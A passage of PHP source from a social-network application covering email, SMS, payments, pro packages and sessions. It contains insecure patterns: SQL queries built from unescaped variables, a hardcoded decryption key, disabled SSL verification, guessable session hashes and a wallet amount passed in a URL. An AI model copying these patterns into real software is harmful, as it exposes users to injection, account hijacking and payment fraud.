            $mail->MsgHTML($fetched_data["message"]);
            $mail->IsHTML(true);
            $send = $mail->send();
            $mail->ClearAddresses();
        }
    }
    $query_one_  = "DELETE FROM " . T_EMAILS . " WHERE `user_id` = {$user_id}";
    $sql_        = mysqli_query($sqlConnect, $query_one_);
    $query_one__ = "UPDATE " . T_USERS . " SET `last_email_sent` = " . time() . " WHERE `user_id` = {$user_id}";
    cache($user_id, 'users', 'delete');
    $sql__       = mysqli_query($sqlConnect, $query_one__);
    return $send;
}
function NRG_AddPostVideoView($post_id = false) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $query = mysqli_query($sqlConnect, "SELECT `videoViews` FROM " . T_POSTS . " WHERE `id` = '$post_id'");
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        if (!empty($fetched_data) && is_array($fetched_data)) {
            $post_views   = $fetched_data["videoViews"];
            $update_query = "UPDATE " . T_POSTS . " SET `videoViews` = `videoViews` + 1  WHERE `id` = '$post_id'";
            if (mysqli_query($sqlConnect, $update_query)) {
                return intval($post_views) + 1;
            }
        }
    }
    return false;
}
function NRG_SendMessage($data = array()) {
    global $nrg, $sqlConnect;
    include_once "assets/libraries/PHPMailer-Master/vendor/autoload.php";
    $mail = new PHPMailer\PHPMailer\PHPMailer();
    if (strpos($data["to_email"], "@google.com") || strpos($data["to_email"], "@facebook.com") || strpos($data["to_email"], "@twitter.com") || strpos($data["to_email"], "@linkedIn.com") || strpos($data["to_email"], "@vk.com") || strpos($data["to_email"], "@instagram.com")) {
        return false;
    }
    $email_from      = $data["from_email"] = NRG_Secure($data["from_email"]);
    $to_email        = $data["to_email"] = NRG_Secure($data["to_email"]);
    $subject         = $data["subject"];
    $message_body    = mysqli_real_escape_string($sqlConnect, $data["message_body"]);
    $data["charSet"] = NRG_Secure($data["charSet"]);
    if (isset($data["insert_database"])) {
        if ($data["insert_database"] == 1) {
            $user_id   = NRG_Secure($nrg["user"]["user_id"]);
            $query_one = mysqli_query($sqlConnect, "INSERT INTO " . T_EMAILS . " (`email_to`, `user_id`, `subject`, `message`) VALUES ('{$to_email}', '{$user_id}', '{$subject}', '{$message_body}')");
            if ($query_one) {
                return true;
            }
        }
        return true;
        exit();
    }
    try {
        if (!empty($data["return"]) && $data["return"] == 'debug') {
            $mail->SMTPDebug = 2;
        }
        
        if ($nrg["config"]["smtp_or_mail"] == "mail") {
            $mail->IsMail();
        } elseif ($nrg["config"]["smtp_or_mail"] == "smtp") {
            $mail->isSMTP();
            $mail->Host        = $nrg["config"]["smtp_host"]; // Specify main and backup SMTP servers
            $mail->SMTPAuth    = true; // Enable SMTP authentication
            $mail->Username    = $nrg["config"]["smtp_username"]; // SMTP username
            $mail->Password    = openssl_decrypt($nrg["config"]["smtp_password"], "AES-128-ECB", "mysecretkey1234"); // SMTP password
            $mail->SMTPSecure  = $nrg["config"]["smtp_encryption"]; // Enable TLS encryption, `ssl` also accepted
            $mail->Port        = $nrg["config"]["smtp_port"];
            $mail->SMTPOptions = array(
                "ssl" => array(
                    "verify_peer" => false,
                    "verify_peer_name" => false,
                    "allow_self_signed" => true
                )
            );
        } else {
            return false;
        }
        $mail->IsHTML($data["is_html"]);
        $mail->setFrom($data["from_email"], $data["from_name"]);
        $mail->addAddress($data["to_email"], $data["to_name"]); // Add a recipient
        $mail->Subject = $data["subject"];
        $mail->CharSet = $data["charSet"];
        $mail->MsgHTML($data["message_body"]);
        if (!empty($data["reply-to"])) {
            $mail->ClearReplyTos();
            $mail->AddReplyTo($data["reply-to"], $data["from_name"]);
        }
        if ($mail->send()) {
            $mail->ClearAddresses();
            return true;
        }
        else{
            if (!empty($data["return"])) {
                return $mail->ErrorInfo;
            }
        }
    } catch (phpmailerException $e) {
        if (!empty($data["return"])) {
            if (!empty($e->errorMessage())) {
                return $e->errorMessage();
            }
            return $mail->ErrorInfo;
        }
        return false;
    } catch (Exception $e) {
        if (!empty($data["return"])) {
            if (!empty($e->getMessage())) {
                return $e->getMessage();
            }
            return $mail->ErrorInfo;
        }
        return false;
    }
}
function NRG_CheckBirthdays($user_id = 0) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 1) {
        return false;
    }
    $data  = array();
    $date  = "-" . date("m") . "-" . date("d");
    $query = mysqli_query($sqlConnect, "SELECT `user_id` FROM " . T_USERS . " WHERE `birthday` LIKE '%{$date}%' AND `user_id` <> '{$user_id}' AND `user_id` IN (SELECT `following_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` = '{$user_id}' AND `active` = '1') ORDER BY RAND() LIMIT 5");
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $user_data = NRG_UserData($fetched_data["user_id"]);
            if ($user_data["birth_privacy"] != 2) {
                $data[] = $user_data;
            }
        }
    }
    return $data;
}

function NRG_SendSMSMessage($to, $message) {
    global $nrg, $sqlConnect;
    if (empty($to)) {
        return false;
    }
    if ($nrg["config"]["sms_provider"] == "twilio" && !empty($nrg["config"]["sms_twilio_username"]) && !empty($nrg["config"]["sms_twilio_password"]) && !empty($nrg["config"]["sms_t_phone_number"])) {
        $account_sid = $nrg["config"]["sms_twilio_username"];
        $auth_token  = $nrg["config"]["sms_twilio_password"];
        $to          = NRG_Secure($to);

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, "https://api.twilio.com/2010-04-01/Accounts/".$account_sid."/Messages");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "Body=".$message."&From=".$nrg["config"]["sms_t_phone_number"]."&To=".$to);
        curl_setopt($ch, CURLOPT_USERPWD, $account_sid . ':' . $auth_token);

        $headers = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        if (!empty($result)) {
            $result = simplexml_load_string($result);
            if (!empty($result->Message) && !empty($result->Message->Status)) {
                return true;
            }
        }
        return false;
    } elseif ($nrg["config"]["sms_provider"] == "infobip" && !empty($nrg["config"]["infobip_api_key"]) && !empty($nrg["config"]["infobip_base_url"])) {

        $to       = NRG_Secure($to);
        if (empty($to)) {
            return false;
        }
        $sms = '{
                  "messages": [
                    {
                      "destinations": [
                        {
                          "to": "'.$to.'"
                        }
                      ],
                      "from": "'.$nrg["config"]["siteName"].'",
                      "text": "'.$message.'"
                    }
                  ]
                }';

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $nrg["config"]["infobip_base_url"].'/sms/2/text/advanced');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $sms);

        $headers = array();
        $headers[] = 'Authorization: App '.$nrg["config"]["infobip_api_key"];
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Accept: application/json';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $result = json_decode($result,true);
        if (!empty($result['messages'])) {
            return true;
        }
        return false;
    } elseif ($nrg["config"]["sms_provider"] == "bulksms" && !empty($nrg["config"]["sms_username"]) && !empty($nrg["config"]["sms_password"])) {
        if (empty($to)) {
            return false;
        }
        $to_ = @explode("+", $to);
        if (empty($to_[1])) {
            return false;
        }
        $messages = array(
          array('to'=> $to, 'body'=>$message)
        );
        $result = send_bulksms_message( json_encode($messages), 'https://api.bulksms.com/v1/messages?auto-unicode=true&longMessageMaxParts=30', $nrg['config']['sms_username'], $nrg['config']['sms_password'] );
        if ($result['http_status'] != 201) {
          return false;
        } else {
          return true;
        }
        // $to      = $to_[1];
        // $url     = $nrg["config"]["eapi"] . "/submission/send_sms/2/2.0";
        // $data    = array(
        //     "username" => $username,
        //     "password" => $password,
        //     "msisdn" => $to,
        //     "message" => $message
        // );
        // $options = array(
        //     "http" => array(
        //         "header" => "Content-type: application/x-www-form-urlencoded\r\n",
        //         "method" => "POST",
        //         "content" => http_build_query($data)
        //     ),
        //     "ssl" => array(
        //         "verify_peer" => false,
        //         "verify_peer_name" => false
        //     )
        // );
        // $context = stream_context_create($options);
        // $result  = file_get_contents($url, false, $context);
        // if (preg_match("/\bIN_PROGRESS\b/", $result)) {
        //     return true;
        // } else {
        //     return $result;
        // }
    } elseif ($nrg["config"]["sms_provider"] == "msg91" && !empty($nrg["config"]["msg91_authKey"])) {
        //Your authentication key
        $authKey      = $nrg["config"]["msg91_authKey"];
        //Multiple mobiles numbers separated by comma
        $mobileNumber = $to;
        //Sender ID,While using route4 sender id should be 6 characters long.
        $senderId     = uniqid();
        //Define route
        $route        = "4";
        //Prepare you post parameters
        $postData     = array(
            "authkey" => $authKey,
            "mobiles" => $mobileNumber,
            "message" => $message,
            "sender" => $senderId,
            "route" => $route
        );
        if (!empty($nrg["config"]["msg91_dlt_id"])) {
            $postData["DLT_TE_ID"] = $nrg["config"]["msg91_dlt_id"];
        }
        //API URL
        $url = "http://api.msg91.com/api/sendhttp.php";
        // init the resource
        $ch  = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postData
        ));
        //Ignore SSL certificate verification
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        //get response
        $output = curl_exec($ch);
        //Print error if any
        if (curl_errno($ch)) {
            return false;
        }
        curl_close($ch);
        return true;
    }
    return false;
}
function NRG_ConfirmUserSMS($user_id, $code) {
    global $sqlConnect;
    $user_id = NRG_Secure($user_id);
    $code    = NRG_Secure($code);
    if (!is_numeric($code) || $code <= 0) {
        return false;
    }
    if (!is_numeric($user_id) || $user_id <= 0) {
        return false;
    }
    $query  = mysqli_query($sqlConnect, " SELECT COUNT(`user_id`)  FROM " . T_USERS . "  WHERE `email_code` = '{$code}' AND `user_id` = '{$user_id}' AND `active` = '0'");
    $result = NRG_Sql_Result($query, 0);
    if ($result == 1) {
        $email_code = md5(rand(1111, 9999) . time());
        $query_two  = mysqli_query($sqlConnect, " UPDATE " . T_USERS . "  SET `active` = '1', `email_code` = '$email_code' WHERE `user_id` = '{$user_id}' ");
        if ($query_two) {
            return true;
        }
    } else {
        return false;
    }
}
function NRG_ConfirmUser($user_id, $code) {
    global $sqlConnect;
    $user_id = NRG_Secure($user_id);
    $code    = NRG_Secure($code);
    if (!is_numeric($code) || $code <= 0) {
        return false;
    }
    if (!is_numeric($user_id) || $user_id <= 0) {
        return false;
    }
    $query  = mysqli_query($sqlConnect, " SELECT COUNT(`user_id`)  FROM " . T_USERS . "  WHERE `sms_code` = '{$code}' AND `user_id` = '{$user_id}' AND `active` = '0'");
    $result = NRG_Sql_Result($query, 0);
    if ($result == 1) {
        $email_code = md5(rand(1111, 9999) . time());
        $query_two  = mysqli_query($sqlConnect, " UPDATE " . T_USERS . "  SET `active` = '1', `email_code` = '$email_code' WHERE `user_id` = '{$user_id}' ");
        if ($query_two) {
            return true;
        }
    } else {
        return false;
    }
}
function NRG_ConfirmSMSUser($user_id, $code, $email_code = "") {
    global $sqlConnect;
    $user_id = NRG_Secure($user_id);
    $code    = NRG_Secure($code);
    if (!is_numeric($code) || $code <= 0) {
        return false;
    }
    if (!is_numeric($user_id) || $user_id <= 0) {
        return false;
    }
    $query  = mysqli_query($sqlConnect, " SELECT COUNT(`user_id`)  FROM " . T_USERS . "  WHERE `sms_code` = '{$code}' AND `user_id` = '{$user_id}'");
    $result = NRG_Sql_Result($query, 0);
    if ($result == 1) {
        $email_code = md5(rand(1111, 9999) . time());
        $query_two  = mysqli_query($sqlConnect, " UPDATE " . T_USERS . "  SET `active` = '1', `email_code` = '$email_code' WHERE `user_id` = '{$user_id}' ");
        if ($query_two) {
            return true;
        }
    } else {
        return false;
    }
}
function NRG_CreateSession() {
    $hash = sha1(rand(1111, 9999));
    if (!empty($_SESSION["hash_id"])) {
        $_SESSION["hash_id"] = $_SESSION["hash_id"];
        return $_SESSION["hash_id"];
    }
    $_SESSION["hash_id"] = $hash;
    return $hash;
}
function NRG_CheckSession($hash = "") {
    if (!isset($_SESSION["hash_id"]) || empty($_SESSION["hash_id"])) {
        return false;
    }
    if (empty($hash)) {
        return false;
    }
    if ($hash == $_SESSION["hash_id"]) {
        return true;
    }
    return false;
}
function NRG_CreateMainSession() {
    $hash = substr(sha1(rand(1111, 9999)), 0, 20);
    if (!empty($_SESSION["main_hash_id"])) {
        $_SESSION["main_hash_id"] = $_SESSION["main_hash_id"];
        return $_SESSION["main_hash_id"];
    }
    $_SESSION["main_hash_id"] = $hash;
    return $hash;
}
function NRG_CheckMainSession($hash = "") {
    if (!isset($_SESSION["main_hash_id"]) || empty($_SESSION["main_hash_id"])) {
        return false;
    }
    if (empty($hash)) {
        return false;
    }
    if ($hash == $_SESSION["main_hash_id"]) {
        return true;
    }
    return false;
}

function NRG_ReplenishingUserBalance($sum) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false || !$sum) {
        return false;
    }
    $user      = $nrg["user"]["user_id"];
    $user_data = NRG_UserData($user);
    if (empty($user_data)) {
        return false;
    }
    $user_balance = $user_data["wallet"];
    $user_balance += $sum;
    $update_data = array(
        "wallet" => $user_balance
    );
    $update      = NRG_UpdateUserData($nrg["user"]["user_id"], $update_data);
    return $update;
}
function NRG_ReplenishWallet($sum) {
    global $nrg;
    if ($nrg["loggedin"] == false || !$sum || $nrg["config"]["paypal"] == "no") {
        return false;
    }
    include_once('assets/includes/paypal_config.php');


    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url . '/v2/checkout/orders');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{
      "intent": "CAPTURE",
      "purchase_units": [
            {
                "items": [
                    {
                        "name": "Wallet Replenishment",
                        "description":  "Pay For ' . $nrg["config"]["siteName"].'",
                        "quantity": "1",
                        "unit_amount": {
                            "currency_code": "'.$nrg["config"]["paypal_currency"].'",
                            "value": "'.$sum.'"
                        }
                    }
                ],
                "amount": {
                    "currency_code": "'.$nrg["config"]["paypal_currency"].'",
                    "value": "'.$sum.'",
                    "breakdown": {
                        "item_total": {
                            "currency_code": "'.$nrg["config"]["paypal_currency"].'",
                            "value": "'.$sum.'"
                        }
                    }
                }
            }
        ],
        "application_context":{
            "shipping_preference":"NO_SHIPPING",
            "return_url": "'.$nrg["config"]["site_url"] . "/requests.php?f=wallet&s=get-paid&success=1&amount={$sum}".'",
            "cancel_url": "'.$nrg["config"]["site_url"] . "/requests.php?f=wallet&s=get-paid&success=1".'"
        }
    }');

    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Authorization: Bearer '.$nrg['paypal_access_token'];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    $result = json_decode($result);
    if (!empty($result) && !empty($result->links) && !empty($result->links[1]) && !empty($result->links[1]->href)) {
        $data = array(
            "status" => 200,
            "type" => "SUCCESS",
            'url' => $result->links[1]->href
        );
        return $data;
    }
    elseif(!empty($result->message)){
        $data = array(
            'type' => 'ERROR',
            'details' => $result->message
        );
        return $data;
    }
}
function NRG_IsUserPro($user_pro = 0) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if ($nrg["config"]["pro"] == 0) {
        return false;
    }
    $user = $user_pro;
    if (empty($user) && $user !== "0") {
        $user = $nrg["user"]["is_pro"];
    }
    if ($user == 1) {
        return true;
    }
    return false;
}
function NRG_GetUserProType($user_type = 0, $type = "post") {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if ($nrg["config"]["pro"] == 0) {
        return false;
    }
    $pro_type = $nrg["user"]["pro_type"];
    if (!empty($user_type) && $user_type > 0 && is_numeric($user_type)) {
        $pro_type = $user_type;
    }
    $data = array();
    $data["type_name"] = $nrg["pro_packages"][$pro_type]['name'] . " " . $nrg["lang"]["member"];
    if ($type == "post") {
        $data["can_boost"] = $nrg["pro_packages"][$pro_type]["posts_promotion"];
    } else {
        $data["can_boost"] = $nrg["pro_packages"][$pro_type]["pages_promotion"];
    }
    $data["color_name"] = $nrg["pro_packages"][$pro_type]["color"];
    $data["type_url"]   = NRG_SeoLink("index.php?link1=upgrade-to");
    $data["icon"]       = "";
    if (in_array($pro_type,array(1,2,3,4))) {
        if ($pro_type == 1) {
            $data["icon"]       = "star";
        }
        else if ($pro_type == 2) {
            $data["icon"]       = "fire";
        }
        else if ($pro_type == 3) {
            $data["icon"]       = "bolt";
        }
        else if ($pro_type == 4) {
            $data["icon"]       = "rocket";
        }
    }
    return $data;
}

function NRG_GetAvUpgrades($user_id) {
    global $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if ($nrg["config"]["pro"] == 0) {
        return false;
    }
    if (empty($user_id)) {
        return false;
    }
    $user    = NRG_UserData($user_id);
    if (empty($user)) {
        return false;
    }
    $can_see = array();
    
    foreach ($nrg["pro_packages"] as $key => $value) {
        
        if ($user['pro_type'] < $key) {
            $can_see[$key] = $value["name"] . " " . $nrg["lang"]["member"] . " " . $value["price"] . NRG_GetCurrency($nrg["config"]["currency"]) . " " . (!empty($value['time_count']) ? $value['time_count'] : '').' '.$nrg['lang'][$value['time']];
        }
    }
    return $can_see;




    // if ($nrg["pro_packages"]["hot"]["status"] == 1) {
    //     $hot_member = $nrg["lang"]["hot"] . " " . $nrg["lang"]["member"] . " " . $nrg["pro_packages"]["hot"]["price"] . NRG_GetCurrency($nrg["config"]["currency"]) . " " . $nrg["lang"]["per_month"];
    // }
    // if ($nrg["pro_packages"]["ultima"]["status"] == 1) {
    //     $ultima_member = $nrg["lang"]["ultima"] . " " . $nrg["lang"]["member"] . " " . $nrg["pro_packages"]["ultima"]["price"] . NRG_GetCurrency($nrg["config"]["currency"]) . " " . $nrg["lang"]["per_year"];
    // }
    // if ($nrg["pro_packages"]["vip"]["status"] == 1) {
    //     $vip_member = $nrg["lang"]["vip"] . " " . $nrg["lang"]["member"] . " " . $nrg["pro_packages"]["vip"]["price"] . NRG_GetCurrency($nrg["config"]["currency"]) . " " . $nrg["lang"]["life_time"];
    // }
    // if ($user["pro_type"] == 1) {
    //     $can_see = array();
    //     if ($nrg["pro_packages"]["hot"]["status"] == 1) {
    //         $can_see["month"] = $hot_member;
    //     }
    //     if ($nrg["pro_packages"]["ultima"]["status"] == 1) {
    //         $can_see["year"] = $ultima_member;
    //     }
    //     if ($nrg["pro_packages"]["vip"]["status"] == 1) {
    //         $can_see["life-time"] = $vip_member;
    //     }
    //     // $can_see = array(
    //     //     'month' => $hot_member,
    //     //     'year' => $ultima_member,
    //     //     'life-time' => $vip_member
    //     // );
    // } elseif ($user["pro_type"] == 2) {
    //     $can_see = array();
    //     if ($nrg["pro_packages"]["ultima"]["status"] == 1) {
    //         $can_see["year"] = $ultima_member;
    //     }
    //     if ($nrg["pro_packages"]["vip"]["status"] == 1) {
    //         $can_see["life-time"] = $vip_member;
    //     }
    //     // $can_see = array(
    //     //     'year' => $ultima_member,
    //     //     'life-time' => $vip_member
    //     // );
    // } elseif ($user["pro_type"] == 3) {
    //     $can_see = array();
    //     if ($nrg["pro_packages"]["vip"]["status"] == 1) {
    //         $can_see["life-time"] = $vip_member;
    //     }
    //     // $can_see = array(
    //     //     'life-time' => $vip_member
    //     // );
    // } elseif ($user["pro_type"] == 4) {
    //     $can_see = array();
    // }
    return $can_see;
}
function NRG_GetProPackages() {
    global $nrg;
    $free_member   = $nrg["lang"]["free_member"];
    $star_member   = $nrg["lang"]["star"] . " " . $nrg["lang"]["member"];
    $hot_member    = $nrg["lang"]["hot"] . " " . $nrg["lang"]["member"];
    $ultima_member = $nrg["lang"]["ultima"] . " " . $nrg["lang"]["member"];
    $vip_member    = $nrg["lang"]["vip"] . " " . $nrg["lang"]["member"];
    $data          = array(
        "free" => array(
            "id" => 0,
            "name" => $free_member
        )
    );
    foreach ($nrg["pro_packages"] as $key => $value) {
        $data[$key] = array('id' => $key,
                            'name' => $value['name']);
    }
    // if ($nrg["pro_packages"]["star"]["status"] == 1) {
    //     $data["star"] = array(
    //         "id" => 1,
    //         "name" => $star_member
    //     );
    // }
    // if ($nrg["pro_packages"]["hot"]["status"] == 1) {
    //     $data["hot"] = array(
    //         "id" => 2,
    //         "name" => $hot_member
    //     );
    // }
    // if ($nrg["pro_packages"]["ultima"]["status"] == 1) {
    //     $data["ultima"] = array(
    //         "id" => 3,
    //         "name" => $ultima_member
    //     );
    // }
    // if ($nrg["pro_packages"]["vip"]["status"] == 1) {
    //     $data["vip"] = array(
    //         "id" => 4,
    //         "name" => $vip_member
    //     );
    // }
    return $data;
}
function NRG_CreatePayment($payment_type = 1) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if ($nrg["config"]["paypal_mode"] == "sandbox") {
        //return false;
    }
    $user_id = $nrg["user"]["user_id"];
    if (!in_array($payment_type, array_keys($nrg["pro_packages"]))) {
        return false;
    }
    $amount = $nrg["pro_packages"][$payment_type]['price'];
    $type = $nrg["pro_packages"][$payment_type]['name'];
    
    // if ($payment_type == 1) {
    //     $amount = $nrg["pro_packages"]["star"]["price"];
    //     $type   = "weekly";
    // } elseif ($payment_type == 2) {
    //     $amount = $nrg["pro_packages"]["hot"]["price"];
    //     $type   = "monthly";
    // } elseif ($payment_type == 3) {
    //     $amount = $nrg["pro_packages"]["ultima"]["price"];
    //     $type   = "yearly";
    // } elseif ($payment_type == 4) {
    //     $amount = $nrg["pro_packages"]["vip"]["price"];
    //     $type   = "lifetime";
    // } else {
    //     return false;
    // }
    $date  = date("n") . "/" . date("Y");
    $time  = time();
    $query = mysqli_query($sqlConnect, "INSERT INTO " . T_PAYMENTS . " (`user_id`, `amount`, `date`, `type`,`time`) VALUES ({$user_id}, {$amount}, '{$date}', '{$type}', '{$time}')");
    if ($query) {
        return true;
    }
}
function NRG_CountAllPaymentData($type) {
    global $nrg, $sqlConnect;
    $type_table = T_PAYMENTS;
    $type       = NRG_Secure($type);
    $query_one  = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM {$type_table} WHERE `type` = '{$type}'");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_CountAllPayment() {
    global $nrg, $sqlConnect;
    $type_table = T_PAYMENTS;
    $query_one  = mysqli_query($sqlConnect, "SELECT `amount` FROM {$type_table}");
    $final_data = 0;
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $final_data += $fetched_data["amount"];
        }
        return $final_data;
    }
    return false;
}
function NRG_CountThisMonthPayment() {
    global $nrg, $sqlConnect;
    $type_table = T_PAYMENTS;
    $date       = date("n") . "/" . date("Y");
    $query_one  = mysqli_query($sqlConnect, "SELECT `amount` FROM {$type_table} WHERE `amount` <> 0 AND `date` = '{$date}'");
    $final_data = 0;
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $final_data += $fetched_data["amount"];
        }
        return $final_data;
    }
    return false;
}
function NRG_GetRegisteredPaymentsStatics($month, $type = "") {
    global $nrg, $sqlConnect;
    $year       = date("Y");
    $type_table = T_PAYMENTS;
    $query_one  = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM {$type_table} WHERE `date` = '{$month}/{$year}' AND `type` = '{$type}'");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        return $fetched_data["count"];
    }
    return false;
}
function NRG_GetPromotedPost() {
    global $nrg, $sqlConnect;
    $year           = date("Y");
    $type_table     = T_POSTS;
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query_one      = mysqli_query($sqlConnect, "SELECT `id` FROM {$type_table} WHERE `boosted` = '1' AND `user_id` NOT IN (SELECT `blocked` FROM " . T_BLOCKS . " WHERE `blocker` = '{$logged_user_id}') AND `user_id` NOT IN (SELECT `blocker` FROM " . T_BLOCKS . " WHERE `blocked` = '{$logged_user_id}') ORDER BY RAND() LIMIT 1");
    if (mysqli_num_rows($query_one)) {
        $fetched_data = mysqli_fetch_assoc($query_one);
        if (!empty($fetched_data)) {
            $post = NRG_PostData($fetched_data["id"]);
            if (is_array($post)) {
                return $post;
            }
        } else {
            return array();
        }
    }
    return array();
}
function NRG_GetPromotedPage() {
    global $nrg, $sqlConnect;
    $type_table     = T_PAGES;
    $data           = array();
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query_one      = mysqli_query($sqlConnect, "SELECT `page_id` FROM {$type_table} WHERE `boosted` = '1' AND `page_id` NOT IN (SELECT `page_id` FROM " . T_PAGES . " WHERE `user_id` = {$logged_user_id} AND `active` = '1') AND `page_id` NOT IN (SELECT `page_id` FROM " . T_PAGES_LIKES . " WHERE `user_id` = {$logged_user_id} AND `active` = '1') ORDER BY RAND() LIMIT 2");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $data[] = NRG_PageData($fetched_data["page_id"]);
        }
    }
    return $data;
}
function NRG_GetBoostedPosts($user_id) {
    global $nrg, $sqlConnect;
    $data  = array();
    $logged_user_id = NRG_Secure($nrg["user"]["user_id"]);
    $query = mysqli_query($sqlConnect, "SELECT `id` FROM " . T_POSTS . " WHERE (`user_id` = {$user_id} OR `page_id` IN (SELECT `page_id` FROM " . T_PAGES . " WHERE `user_id` = {$logged_user_id} AND `active` = '1')) AND `boosted` = '1' ORDER BY id DESC");
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $data[] = NRG_PostData($fetched_data["id"]);
        }
    }
    return $data;
}
function NRG_GetBoostedPages($user_id) {
    global $nrg, $sqlConnect;
    $data  = array();
    $query = mysqli_query($sqlConnect, "SELECT `page_id` FROM " . T_PAGES . " WHERE `user_id` = {$user_id} AND `boosted` = '1' ORDER BY `page_id` DESC");
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $data[] = NRG_PageData($fetched_data["page_id"]);
        }
    }
    return $data;
}
function NRG_RedirectSmooth($url) {
    global $nrg;
    if ($nrg["config"]["smooth_loading"] == 0) {
        return header("Location: $url");
        exit();
    } else {
        return $nrg["redirect"] = 1;
    }
}
function NRG_DownUpgradeUser($user_id) {
    global $nrg, $sqlConnect;
    if (empty($user_id)) {
        return false;
    }
    $query_one = mysqli_query($sqlConnect, "UPDATE " . T_POSTS . " SET `boosted` = '0' WHERE `user_id` = '{$user_id}'");
    $query_one = mysqli_query($sqlConnect, "UPDATE " . T_PAGES . " SET `boosted` = '0' WHERE `user_id` = '{$user_id}'");
}
function NRG_GetCurrency($currency) {
    global $nrg, $sqlConnect;
    if (empty($currency)) {
        return false;
    }
    if (!in_array($currency, array_keys($nrg["config"]["currency_symbol_array"]))) {
        return '$';
    }
    return $nrg["config"]["currency_symbol_array"][$currency];
    // $currency_ = '$';
    // switch ($currency) {
    //     case 'USD':
    //         $currency_ = '$';
    //         break;
    //     case 'JPY':
    //         $currency_ = '¥';
    //         break;
    //     case 'TRY':
    //         $currency_ = '₺';
    //         break;
    //     case 'GBP':
    //         $currency_ = '£';
    //         break;
    //     case 'EUR':
    //         $currency_ = '€';
    //         break;
    //     case 'AUD':
    //         $currency_ = '$';
    //         break;
    //     case 'INR':
    //         $currency_ = '₹';
    //         break;
    //     case 'RUB':
    //         $currency_ = 'RUB';
    //         break;
    //     case 'PLN':
    //         $currency_ = 'zł';
    //         break;
    //     case 'ILS':
    //         $currency_ = 'ILS';
    //         break;
    //     case 'BRL':
    //         $currency_ = 'R$';
    //         break;
    // }
    // return $currency_;
}
function NRG_CreateNewVideoCall($re_data) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($re_data)) {
        return false;
    }
    $user_data  = NRG_UserData($re_data["from_id"]);
    $user_data2 = NRG_UserData($re_data["to_id"]);
    if (empty($user_data) || empty($user_data2)) {
        return false;
    }
    $logged_user_id    = NRG_Secure($nrg["user"]["user_id"]);
    $query1            = mysqli_query($sqlConnect, "DELETE FROM " . T_VIDEOS_CALLES . " WHERE `from_id` = {$logged_user_id} OR `to_id` = {$logged_user_id}");
    $re_data["active"] = 0;
    $re_data["called"] = $re_data["from_id"];
    $re_data["time"]   = NRG_Secure(time());
    $fields            = "`" . implode("`, `", array_keys($re_data)) . "`";
    $data              = '\'' . implode('\', \'', $re_data) . '\'';
    $query             = mysqli_query($sqlConnect, "INSERT INTO " . T_VIDEOS_CALLES . " ({$fields}) VALUES ({$data})");
    if ($query) {
        return mysqli_insert_id($sqlConnect);
    } else {
        return false;
    }
}
function NRG_CreateNewAgoraCall($re_data = array()) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($re_data)) {
        return false;
    }
    $user_data  = NRG_UserData($re_data["from_id"]);
    $user_data2 = NRG_UserData($re_data["to_id"]);
    if (empty($user_data) || empty($user_data2)) {
